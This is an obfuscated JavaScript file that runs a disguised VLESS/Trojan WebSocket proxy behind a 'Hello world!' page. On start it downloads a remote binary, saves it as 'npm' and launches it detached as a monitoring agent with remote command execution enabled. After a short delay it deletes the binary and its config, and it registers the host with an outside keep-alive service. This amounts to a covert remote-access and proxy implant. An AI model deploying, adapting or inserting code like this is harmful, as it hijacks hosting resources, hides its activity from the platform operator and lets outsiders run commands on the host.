const _0x272b80=_0x5861;(function(_0x2dda8b,_0x4e1485){const _0x327078=_0x5861,_0x46f38d=_0x2dda8b();while(!![]){try{const _0x3ee169=parseInt(_0x327078(0x10e))/0x1*(-parseInt(_0x327078(0x14c))/0x2)+-parseInt(_0x327078(0x14b))/0x3+-parseInt(_0x327078(0x11c))/0x4+parseInt(_0x327078(0x112))/0x5*(parseInt(_0x327078(0x15d))/0x6)+-parseInt(_0x327078(0x14a))/0x7+parseInt(_0x327078(0x123))/0x8+parseInt(_0x327078(0x17a))/0x9*(parseInt(_0x327078(0x118))/0xa);if(_0x3ee169===_0x4e1485)break;else _0x46f38d['push'](_0x46f38d['shift']());}catch(_0x2fb608){_0x46f38d['push'](_0x46f38d['shift']());}}}(_0x347d,0xb0a90));function _0x347d(){const _0x271a1b=['hex','--tls','Unknown','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm','readUInt8','arm','application/dns-json','every','https://amd64.ssss.nyc.mn/v1','listen','Automatic\x20Access\x20Task\x20added\x20successfully','createHash','crypto','NAME','net','error','\x20-p\x20','readFile','createWriteStream','&fp=chrome&type=ws&host=','459981hfEvSm','child_process','url','&type=A','send','finish','npm\x20running\x20error:','https://arm64.ssss.nyc.mn/v1','toString','false','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','5769ebb5-f621-4e93-af7a-97e84af6b3e1','unlink','data','setsid\x20nohup\x20./npm\x20-s\x20','https://arm64.ssss.nyc.mn/agent','UUID','8.8.4.4','NEZHA_KEY','https://speed.cloudflare.com/meta','17788UjriUe','writeHead','text/html','1234.abc.com','5iSIKmW','arm64','split','https://amd64.ssss.nyc.mn/agent','env','slice','140YiwqQw','2087','npm\x20download\x20successfully','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1831580VTQNqQ','reduce','pipe','true','WSPATH','map','config.yaml','10131888DQPaOB','includes','Answer',':443?encryption=none&security=tls&sni=','sub','update','npm\x20is\x20already\x20running,\x20skip\x20running...','join','SUB_PATH','axios','replace','Hello\x20world!',':443?security=tls&sni=','connect','once','end','buffer','AUTO_ACCESS','pop','connection','NEZHA_SERVER','createServer','utf-8','sha224','index.html','&path=%2F','Not\x20Found\x0a','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','npm\x20is\x20running','application/json','readUInt16BE','length','find','1.1.1.1','log','then','DOMAIN','Server\x20is\x20running\x20on\x20port\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','4633258cUUnmK','792987tGWuVp','22TWayna','country','write','arch','NEZHA_PORT','close','8443','from','trojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/plain','concat','2053','catch','writeFileSync','decode','client_secret:\x20','1928244dfGBfx','/bin/bash','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','substr','2096','https://dns.google/resolve?name=','message','get'];_0x347d=function(){return _0x271a1b;};return _0x347d();}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x272b80(0x12c)),net=require(_0x272b80(0x174)),path=require('path'),crypto=require(_0x272b80(0x172)),{Buffer}=require(_0x272b80(0x133)),{exec,execSync}=require(_0x272b80(0x17b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x272b80(0x116)][_0x272b80(0x10a)]||_0x272b80(0x185),NEZHA_SERVER=process['env'][_0x272b80(0x137)]||'',NEZHA_PORT=process[_0x272b80(0x116)][_0x272b80(0x150)]||'',NEZHA_KEY=process[_0x272b80(0x116)][_0x272b80(0x10c)]||'',DOMAIN=process[_0x272b80(0x116)][_0x272b80(0x147)]||_0x272b80(0x111),AUTO_ACCESS=process[_0x272b80(0x116)][_0x272b80(0x134)]||!![],WSPATH=process['env'][_0x272b80(0x120)]||UUID[_0x272b80(0x117)](0x0,0x8),SUB_PATH=process[_0x272b80(0x116)][_0x272b80(0x12b)]||_0x272b80(0x127),NAME=process[_0x272b80(0x116)][_0x272b80(0x173)]||'Hug',PORT=process[_0x272b80(0x116)]['PORT']||0x1eb4;let ISP='';function _0x5861(_0x2efcb7,_0x29d497){const _0x347dbe=_0x347d();return _0x5861=function(_0x58613d,_0x418bad){_0x58613d=_0x58613d-0x106;let _0x4a58ad=_0x347dbe[_0x58613d];return _0x4a58ad;},_0x5861(_0x2efcb7,_0x29d497);}const GetISP=async()=>{const _0x52e123=_0x272b80;try{const _0x58244d=await axios[_0x52e123(0x164)](_0x52e123(0x10d)),_0x4d679a=_0x58244d['data'];ISP=(_0x4d679a[_0x52e123(0x14d)]+'-'+_0x4d679a['asOrganization'])['replace'](/ /g,'_');}catch(_0x586326){ISP=_0x52e123(0x167);}};GetISP();const httpServer=http[_0x272b80(0x138)]((_0x2faf2b,_0x57b050)=>{const _0x41d537=_0x272b80;if(_0x2faf2b[_0x41d537(0x17c)]==='/'){const _0x371d4f=path['join'](__dirname,_0x41d537(0x13b));fs[_0x41d537(0x177)](_0x371d4f,'utf8',(_0x14f5df,_0x244870)=>{const _0x2259bd=_0x41d537;if(_0x14f5df){_0x57b050[_0x2259bd(0x10f)](0xc8,{'Content-Type':_0x2259bd(0x110)}),_0x57b050[_0x2259bd(0x132)](_0x2259bd(0x12e));return;}_0x57b050[_0x2259bd(0x10f)](0xc8,{'Content-Type':'text/html'}),_0x57b050[_0x2259bd(0x132)](_0x244870);});return;}else{if(_0x2faf2b[_0x41d537(0x17c)]==='/'+SUB_PATH){const _0x42759d='vless://'+UUID+'@'+DOMAIN+_0x41d537(0x126)+DOMAIN+_0x41d537(0x179)+DOMAIN+_0x41d537(0x13c)+WSPATH+'#'+NAME+'-'+ISP,_0x30ec4e=_0x41d537(0x154)+UUID+'@'+DOMAIN+_0x41d537(0x12f)+DOMAIN+_0x41d537(0x179)+DOMAIN+_0x41d537(0x13c)+WSPATH+'#'+NAME+'-'+ISP,_0x29fdc0=_0x42759d+'\x0a'+_0x30ec4e,_0xf48e5c=Buffer[_0x41d537(0x153)](_0x29fdc0)[_0x41d537(0x182)]('base64');_0x57b050[_0x41d537(0x10f)](0xc8,{'Content-Type':_0x41d537(0x156)}),_0x57b050['end'](_0xf48e5c+'\x0a');}else _0x57b050[_0x41d537(0x10f)](0x194,{'Content-Type':_0x41d537(0x156)}),_0x57b050[_0x41d537(0x132)](_0x41d537(0x13d));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x272b80(0x12d)](/-/g,''),DNS_SERVERS=[_0x272b80(0x10b),_0x272b80(0x144)];function resolveHost(_0x16f730){return new Promise((_0x5b9cc2,_0xc393a5)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x16f730)){_0x5b9cc2(_0x16f730);return;}let _0x44156f=0x0;function _0x4a576d(){const _0x4fbbfe=_0x5861;if(_0x44156f>=DNS_SERVERS[_0x4fbbfe(0x142)]){_0xc393a5(new Error('Failed\x20to\x20resolve\x20'+_0x16f730+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5e9860=DNS_SERVERS[_0x44156f];_0x44156f++;const _0x4ea74e=_0x4fbbfe(0x162)+encodeURIComponent(_0x16f730)+_0x4fbbfe(0x17d);axios[_0x4fbbfe(0x164)](_0x4ea74e,{'timeout':0x1388,'headers':{'Accept':_0x4fbbfe(0x16c)}})['then'](_0x4a1626=>{const _0x190932=_0x4fbbfe,_0x52c52=_0x4a1626['data'];if(_0x52c52['Status']===0x0&&_0x52c52[_0x190932(0x125)]&&_0x52c52['Answer'][_0x190932(0x142)]>0x0){const _0x1e082d=_0x52c52['Answer'][_0x190932(0x143)](_0x61d346=>_0x61d346['type']===0x1);if(_0x1e082d){_0x5b9cc2(_0x1e082d[_0x190932(0x107)]);return;}}_0x4a576d();})[_0x4fbbfe(0x159)](_0xdad0d5=>{_0x4a576d();});}_0x4a576d();});}function handleVlessConnection(_0x3729b4,_0x479f2b){const _0x270b65=_0x272b80,[_0x4e11bf]=_0x479f2b,_0x566935=_0x479f2b[_0x270b65(0x117)](0x1,0x11);if(!_0x566935['every']((_0x50008e,_0xe6c5ee)=>_0x50008e==parseInt(uuid['substr'](_0xe6c5ee*0x2,0x2),0x10)))return![];let _0x31beab=_0x479f2b[_0x270b65(0x117)](0x11,0x12)[_0x270b65(0x16a)]()+0x13;const _0x2b4580=_0x479f2b['slice'](_0x31beab,_0x31beab+=0x2)['readUInt16BE'](0x0),_0x3dba1a=_0x479f2b[_0x270b65(0x117)](_0x31beab,_0x31beab+=0x1)[_0x270b65(0x16a)](),_0x2638c2=_0x3dba1a==0x1?_0x479f2b[_0x270b65(0x117)](_0x31beab,_0x31beab+=0x4)['join']('.'):_0x3dba1a==0x2?new TextDecoder()[_0x270b65(0x15b)](_0x479f2b[_0x270b65(0x117)](_0x31beab+0x1,_0x31beab+=0x1+_0x479f2b[_0x270b65(0x117)](_0x31beab,_0x31beab+0x1)[_0x270b65(0x16a)]())):_0x3dba1a==0x3?_0x479f2b['slice'](_0x31beab,_0x31beab+=0x10)[_0x270b65(0x11d)]((_0x5539f7,_0x4bb164,_0x43bceb,_0x265660)=>_0x43bceb%0x2?_0x5539f7['concat'](_0x265660['slice'](_0x43bceb-0x1,_0x43bceb+0x1)):_0x5539f7,[])['map'](_0x1fa09f=>_0x1fa09f[_0x270b65(0x141)](0x0)[_0x270b65(0x182)](0x10))[_0x270b65(0x12a)](':'):'';_0x3729b4[_0x270b65(0x17e)](new Uint8Array([_0x4e11bf,0x0]));const _0x1a65e6=createWebSocketStream(_0x3729b4);return resolveHost(_0x2638c2)[_0x270b65(0x146)](_0x220678=>{const _0x484b69=_0x270b65;net[_0x484b69(0x130)]({'host':_0x220678,'port':_0x2b4580},function(){const _0x99fbb3=_0x484b69;this[_0x99fbb3(0x14e)](_0x479f2b['slice'](_0x31beab)),_0x1a65e6['on'](_0x99fbb3(0x175),()=>{})[_0x99fbb3(0x11e)](this)['on'](_0x99fbb3(0x175),()=>{})[_0x99fbb3(0x11e)](_0x1a65e6);})['on'](_0x484b69(0x175),()=>{});})[_0x270b65(0x159)](_0x63d46d=>{const _0x5b2fd6=_0x270b65;net[_0x5b2fd6(0x130)]({'host':_0x2638c2,'port':_0x2b4580},function(){const _0x18c4a2=_0x5b2fd6;this[_0x18c4a2(0x14e)](_0x479f2b[_0x18c4a2(0x117)](_0x31beab)),_0x1a65e6['on']('error',()=>{})[_0x18c4a2(0x11e)](this)['on'](_0x18c4a2(0x175),()=>{})[_0x18c4a2(0x11e)](_0x1a65e6);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x59f2cc,_0xa35721){const _0x5ec1a0=_0x272b80;try{if(_0xa35721[_0x5ec1a0(0x142)]<0x3a)return![];const _0x31911b=_0xa35721[_0x5ec1a0(0x117)](0x0,0x38)['toString'](),_0x1c4f75=[UUID];let _0x1a587e=null;for(const _0x559f30 of _0x1c4f75){const _0x241a31=crypto[_0x5ec1a0(0x171)](_0x5ec1a0(0x13a))[_0x5ec1a0(0x128)](_0x559f30)['digest'](_0x5ec1a0(0x165));if(_0x241a31===_0x31911b){_0x1a587e=_0x559f30;break;}}if(!_0x1a587e)return![];let _0x163a8c=0x38;_0xa35721[_0x163a8c]===0xd&&_0xa35721[_0x163a8c+0x1]===0xa&&(_0x163a8c+=0x2);const _0x382855=_0xa35721[_0x163a8c];if(_0x382855!==0x1)return![];_0x163a8c+=0x1;const _0x2dbc5f=_0xa35721[_0x163a8c];_0x163a8c+=0x1;let _0x5d75d4,_0x41c780;if(_0x2dbc5f===0x1)_0x5d75d4=_0xa35721[_0x5ec1a0(0x117)](_0x163a8c,_0x163a8c+0x4)['join']('.'),_0x163a8c+=0x4;else{if(_0x2dbc5f===0x3){const _0x50c95c=_0xa35721[_0x163a8c];_0x163a8c+=0x1,_0x5d75d4=_0xa35721[_0x5ec1a0(0x117)](_0x163a8c,_0x163a8c+_0x50c95c)[_0x5ec1a0(0x182)](),_0x163a8c+=_0x50c95c;}else{if(_0x2dbc5f===0x4)_0x5d75d4=_0xa35721[_0x5ec1a0(0x117)](_0x163a8c,_0x163a8c+0x10)[_0x5ec1a0(0x11d)]((_0x12b3d4,_0x192335,_0x342dce,_0x4318c7)=>_0x342dce%0x2?_0x12b3d4[_0x5ec1a0(0x157)](_0x4318c7['slice'](_0x342dce-0x1,_0x342dce+0x1)):_0x12b3d4,[])[_0x5ec1a0(0x121)](_0x1252a1=>_0x1252a1[_0x5ec1a0(0x141)](0x0)[_0x5ec1a0(0x182)](0x10))[_0x5ec1a0(0x12a)](':'),_0x163a8c+=0x10;else return![];}}_0x41c780=_0xa35721[_0x5ec1a0(0x141)](_0x163a8c),_0x163a8c+=0x2;_0x163a8c<_0xa35721[_0x5ec1a0(0x142)]&&_0xa35721[_0x163a8c]===0xd&&_0xa35721[_0x163a8c+0x1]===0xa&&(_0x163a8c+=0x2);const _0x23fa23=createWebSocketStream(_0x59f2cc);return resolveHost(_0x5d75d4)[_0x5ec1a0(0x146)](_0x17d2f5=>{const _0x3b369c=_0x5ec1a0;net[_0x3b369c(0x130)]({'host':_0x17d2f5,'port':_0x41c780},function(){const _0x4ab679=_0x3b369c;_0x163a8c<_0xa35721['length']&&this[_0x4ab679(0x14e)](_0xa35721['slice'](_0x163a8c)),_0x23fa23['on'](_0x4ab679(0x175),()=>{})[_0x4ab679(0x11e)](this)['on'](_0x4ab679(0x175),()=>{})[_0x4ab679(0x11e)](_0x23fa23);})['on'](_0x3b369c(0x175),()=>{});})['catch'](_0x46d5fb=>{const _0x5427fa=_0x5ec1a0;net[_0x5427fa(0x130)]({'host':_0x5d75d4,'port':_0x41c780},function(){const _0x1ebcd8=_0x5427fa;_0x163a8c<_0xa35721['length']&&this[_0x1ebcd8(0x14e)](_0xa35721[_0x1ebcd8(0x117)](_0x163a8c)),_0x23fa23['on'](_0x1ebcd8(0x175),()=>{})[_0x1ebcd8(0x11e)](this)['on']('error',()=>{})['pipe'](_0x23fa23);})['on'](_0x5427fa(0x175),()=>{});}),!![];}catch(_0x19737d){return![];}}wss['on'](_0x272b80(0x136),(_0xc09406,_0x5b2455)=>{const _0x5b9303=_0x272b80,_0x1a2944=_0x5b2455[_0x5b9303(0x17c)]||'';_0xc09406[_0x5b9303(0x131)](_0x5b9303(0x163),_0x2513f1=>{const _0x5a7b27=_0x5b9303;if(_0x2513f1[_0x5a7b27(0x142)]>0x11&&_0x2513f1[0x0]===0x0){const _0x52fbc9=_0x2513f1[_0x5a7b27(0x117)](0x1,0x11),_0x2455a8=_0x52fbc9[_0x5a7b27(0x16d)]((_0x1ade3f,_0x146c53)=>_0x1ade3f==parseInt(uuid[_0x5a7b27(0x160)](_0x146c53*0x2,0x2),0x10));if(_0x2455a8){!handleVlessConnection(_0xc09406,_0x2513f1)&&_0xc09406['close']();return;}}!handleTrojanConnection(_0xc09406,_0x2513f1)&&_0xc09406[_0x5a7b27(0x151)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0xabab7c=_0x272b80,_0x4c5152=os[_0xabab7c(0x14f)]();return _0x4c5152===_0xabab7c(0x16b)||_0x4c5152===_0xabab7c(0x113)||_0x4c5152==='aarch64'?!NEZHA_PORT?_0xabab7c(0x181):_0xabab7c(0x109):!NEZHA_PORT?_0xabab7c(0x16e):_0xabab7c(0x115);},downloadFile=async()=>{const _0x3fd3a6=_0x272b80;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x30fc12=getDownloadUrl(),_0x3db60a=await axios({'method':'get','url':_0x30fc12,'responseType':'stream'}),_0x3aabb7=fs[_0x3fd3a6(0x178)](_0x3fd3a6(0x169));return _0x3db60a[_0x3fd3a6(0x107)][_0x3fd3a6(0x11e)](_0x3aabb7),new Promise((_0x1c9ba2,_0x1bb0f8)=>{const _0x4ac1a6=_0x3fd3a6;_0x3aabb7['on'](_0x4ac1a6(0x17f),()=>{const _0x48b6e3=_0x4ac1a6;console[_0x48b6e3(0x145)](_0x48b6e3(0x11a)),exec('chmod\x20+x\x20npm',_0x14e2d8=>{if(_0x14e2d8)_0x1bb0f8(_0x14e2d8);_0x1c9ba2();});}),_0x3aabb7['on']('error',_0x1bb0f8);});}catch(_0x10aabb){throw _0x10aabb;}},runnz=async()=>{const _0x57cf94=_0x272b80;try{const _0x307fce=execSync(_0x57cf94(0x13e),{'encoding':_0x57cf94(0x139)});if(_0x307fce['trim']()!==''){console['log'](_0x57cf94(0x129));return;}}catch(_0x31f6d0){}await downloadFile();let _0x4cd3ba='',_0x29e3d9=['443',_0x57cf94(0x152),_0x57cf94(0x161),_0x57cf94(0x119),'2083',_0x57cf94(0x158)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1071e8=_0x29e3d9['includes'](NEZHA_PORT)?_0x57cf94(0x166):'';_0x4cd3ba=_0x57cf94(0x108)+NEZHA_SERVER+':'+NEZHA_PORT+_0x57cf94(0x176)+NEZHA_KEY+'\x20'+_0x1071e8+_0x57cf94(0x155);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4887d9=NEZHA_SERVER[_0x57cf94(0x124)](':')?NEZHA_SERVER[_0x57cf94(0x114)](':')[_0x57cf94(0x135)]():'',_0x200dcb=_0x29e3d9[_0x57cf94(0x124)](_0x4887d9)?_0x57cf94(0x11f):_0x57cf94(0x183),_0x5228ae=_0x57cf94(0x15c)+NEZHA_KEY+_0x57cf94(0x149)+NEZHA_SERVER+_0x57cf94(0x168)+_0x200dcb+_0x57cf94(0x15f)+UUID;fs[_0x57cf94(0x15a)](_0x57cf94(0x122),_0x5228ae);}_0x4cd3ba=_0x57cf94(0x11b);}else{console[_0x57cf94(0x145)](_0x57cf94(0x184));return;}}try{exec(_0x4cd3ba,{'shell':_0x57cf94(0x15e)},_0x48f835=>{const _0x363f75=_0x57cf94;if(_0x48f835)console[_0x363f75(0x175)](_0x363f75(0x180),_0x48f835);else console[_0x363f75(0x145)](_0x363f75(0x13f));});}catch(_0xe71439){console[_0x57cf94(0x175)]('error:\x20'+_0xe71439);}};async function addAccessTask(){const _0x225352=_0x272b80;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x405a31='https://'+DOMAIN;try{const _0x3426db=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x405a31},{'headers':{'Content-Type':_0x225352(0x140)}});console[_0x225352(0x145)](_0x225352(0x170));}catch(_0x323482){}}const delFiles=()=>{const _0x215f76=_0x272b80;fs[_0x215f76(0x106)](_0x215f76(0x169),()=>{}),fs[_0x215f76(0x106)](_0x215f76(0x122),()=>{});};httpServer[_0x272b80(0x16f)](PORT,()=>{const _0x15b3bf=_0x272b80;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x15b3bf(0x145)](_0x15b3bf(0x148)+PORT);});
